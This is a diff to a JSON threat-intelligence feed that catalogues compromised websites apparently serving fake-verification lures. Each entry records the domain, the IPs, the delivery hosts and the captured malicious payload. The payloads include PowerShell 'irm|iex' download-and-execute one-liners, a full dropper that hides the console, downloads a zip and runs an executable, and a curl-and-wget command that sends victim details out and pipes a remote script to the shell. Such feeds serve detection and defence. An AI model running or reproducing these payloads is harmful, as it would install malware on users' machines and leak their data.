@@ -1,5 +1,418 @@
 [
   {
+    "UrlDomain": "www.100kinks.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "146.59.209.152"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/e5b08024c3c972ec",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=add3164684f61d651fbec01a02f605ce6eb0fcb89f2a5c9a&amp;_v=29925654",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=add3164684f61d651fbec01a02f605ce6eb0fcb89f2a5c9a&_v=29925654",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/e5b08024c3c972ec'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/e5b08024c3c972ec"
+    ],
+    "ReportId": "cmwuxq4g306xh0nml3kbjotgd",
+    "ScannedAt": "2026-11-24T16:54:36.120000+00:00"
+  },
+  {
+    "UrlDomain": "boutiquehotellacarriona.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "199.250.212.116"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
+    ],
+    "ReportId": "cmwuxix9g06pq0nmlirq7rait",
+    "ScannedAt": "2026-11-24T16:49:00.140000+00:00"
+  },
+  {
+    "UrlDomain": "instabill.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "192.124.249.160"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/437dc7e50c68cd86",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=fd31a7ad950e56856e09dcb32f0fc58caec1ad7da5c91b0a&amp;_v=29925644",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/437dc7e50c68cd86'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/437dc7e50c68cd86"
+    ],
+    "ReportId": "cmwuxg62u06ol0nml8thzwm4n",
+    "ScannedAt": "2026-11-24T16:46:51.616000+00:00"
+  },
+  {
+    "UrlDomain": "quimbandaexuveludo.com.br",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "192.185.177.36"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/90ee51f2617da38c",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/90ee51f2617da38c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/90ee51f2617da38c"
+    ],
+    "ReportId": "cmwuxeyr906nm0nmlxau9mwba",
+    "ScannedAt": "2026-11-24T16:45:55.515000+00:00"
+  },
+  {
+    "UrlDomain": "saadiabatool.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.53.216"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/3458de5112653301",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29925643",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/3458de5112653301'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/3458de5112653301"
+    ],
+    "ReportId": "cmwuxcz9d06kx0nmlj3llfvld",
+    "ScannedAt": "2026-11-24T16:44:22.859000+00:00"
+  },
+  {
+    "UrlDomain": "camelotsolarpower.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.108.98.132"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/a3bde46f660137b8",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29925640",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/a3bde46f660137b8'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/a3bde46f660137b8"
+    ],
+    "ReportId": "cmwux8saq06hy0nmln5cx5hu4",
+    "ScannedAt": "2026-11-24T16:41:07.160000+00:00"
+  },
+  {
+    "UrlDomain": "8xbetpro.org",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "104.21.88.193"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/4349f1daacd50bcc",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29925640",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/4349f1daacd50bcc'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/4349f1daacd50bcc"
+    ],
+    "ReportId": "cmwux82os06h70nmlecfdp2e6",
+    "ScannedAt": "2026-11-24T16:40:33.834000+00:00"
+  },
+  {
+    "UrlDomain": "www.rsudkotamakassar.or.id",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "202.10.43.46"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/569f53cf050814f3",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/569f53cf050814f3'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/569f53cf050814f3"
+    ],
+    "ReportId": "cmwux7eqb06dx0nml3ym5stvp",
+    "ScannedAt": "2026-11-24T16:40:02.889000+00:00"
+  },
+  {
+    "UrlDomain": "gitetrafourine.fr",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "109.234.167.164"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/0c422f1bf6150bfd",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29925638",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/0c422f1bf6150bfd'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/0c422f1bf6150bfd"
+    ],
+    "ReportId": "cmwux6fol06d20nmlikoxhv2a",
+    "ScannedAt": "2026-11-24T16:39:17.534000+00:00"
+  },
+  {
+    "UrlDomain": "tiny-panda.ai",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "145.79.28.50"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/bf6b42dc73b402cd",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29925638",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/bf6b42dc73b402cd'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/bf6b42dc73b402cd"
+    ],
+    "ReportId": "cmwux64si06c90nml5omttmwo",
+    "ScannedAt": "2026-11-24T16:39:03.435000+00:00"
+  },
+  {
+    "UrlDomain": "nutrimedlabs.pk",
+    "DeliveryUrl": [
+      "makeverizyjar.info",
+      "lovezramexar.info",
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "172.67.213.17"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwux5vn3069i0nml8k905ktr",
+    "ScannedAt": "2026-11-24T16:38:51.545000+00:00"
+  },
+  {
+    "UrlDomain": "garrison2022.wpenginepowered.com",
+    "DeliveryUrl": [
+      "cloudeccentric.cc",
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "141.193.213.11"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/2d2266c36f199d9a",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/2d2266c36f199d9a'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/2d2266c36f199d9a"
+    ],
+    "ReportId": "cmwux5p2g066n0nmlp7z9ykhl",
+    "ScannedAt": "2026-11-24T16:38:43.011000+00:00"
+  },
+  {
+    "UrlDomain": "avionicblackcar.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "160.153.0.144"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/ea37da5c216f5f5c",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/ea37da5c216f5f5c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/ea37da5c216f5f5c"
+    ],
+    "ReportId": "cmwux5mi5066j0nml8pky1j37",
+    "ScannedAt": "2026-11-24T16:38:39.376000+00:00"
+  },
+  {
+    "UrlDomain": "vote-kng528.aduide.id",
+    "DeliveryUrl": [
+      "img-codes-cloude.info",
+      "script.google.com",
+      "claude-flare-verification.vercel.app",
+      "2fvote-kng528.aduide.id"
+    ],
+    "PayloadUrl": [
+      "https://claude-flare-verification.vercel.app/lin",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://claude-flare-verification.vercel.app/win",
+      "https://claude-flare-verification.vercel.app/mac"
+    ],
+    "IP": [
+      "202.10.43.63"
+    ],
+    "Related": [
+      {
+        "Value": "https://skutgrion.pro/t.js?site=efe7fde22076dd7addf30094836fc263",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "curl -sL -d \"id=15d2bf00-1751-4e33-a4c2-112a1403025c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fvote-kng528.aduide.id%2F&os=Linux%20x86_64&lastVisitAt=2026-11-24T16%3A35%3A29.941Z&lastShellAt=2026-11-24T16%3A35%3A29.941Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://claude-flare-verification.vercel.app/lin"
+    ],
+    "ReportId": "cmwux3dr005zw0nmlgz3xo2on",
+    "ScannedAt": "2026-11-24T16:36:55.065000+00:00"
+  },
+  {
+    "UrlDomain": "mundotravelsm.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "213.199.41.19"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/8b7f0c443dc9c01c",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29925632",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/8b7f0c443dc9c01c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/8b7f0c443dc9c01c"
+    ],
+    "ReportId": "cmwuwyzjh05wa0nmlhr2fderx",
+    "ScannedAt": "2026-11-24T16:33:30.034000+00:00"
+  },
+  {
+    "UrlDomain": "eazycorp.com.br",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "50.116.112.137"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
+    ],
+    "ReportId": "cmwuwxtsy05ss0nmlxyc8744b",
+    "ScannedAt": "2026-11-24T16:32:35.953000+00:00"
+  },
+  {
+    "UrlDomain": "aspectuspeliculas.com.br",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "191.6.211.83"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
+    ],
+    "ReportId": "cmwuwwrc505ra0nmluu7bv6rm",
+    "ScannedAt": "2026-11-24T16:31:46.051000+00:00"
+  },
+  {
     "UrlDomain": "aaau.org.ua",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -11703,58 +12116,5 @@
     ],
     "ReportId": "cmwi3te6h0xgl0omlrat1pbrc",
     "ScannedAt": "2026-11-15T17:24:06.080000+00:00"
-  },
-  {
-    "UrlDomain": "www.erikarenealarsen.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "162.241.217.93"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/058ff855ad8e7e30",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29912691",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/058ff855ad8e7e30'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/058ff855ad8e7e30"
-    ],
-    "ReportId": "cmwi2o0iz0wl70omljttx6np4",
-    "ScannedAt": "2026-11-15T16:51:55.497000+00:00"
-  },
-  {
-    "UrlDomain": "diamondqualitycontractors.com",
-    "DeliveryUrl": [
-      "framesavecloudjs.beer",
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "160.153.0.228"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/6a72ba2774c19eaf",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/6a72ba2774c19eaf'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/6a72ba2774c19eaf"
-    ],
-    "ReportId": "cmwi2ffgu0wgc0omlvztx57aj",
-    "ScannedAt": "2026-11-15T16:45:14.945000+00:00"
   }
 ]
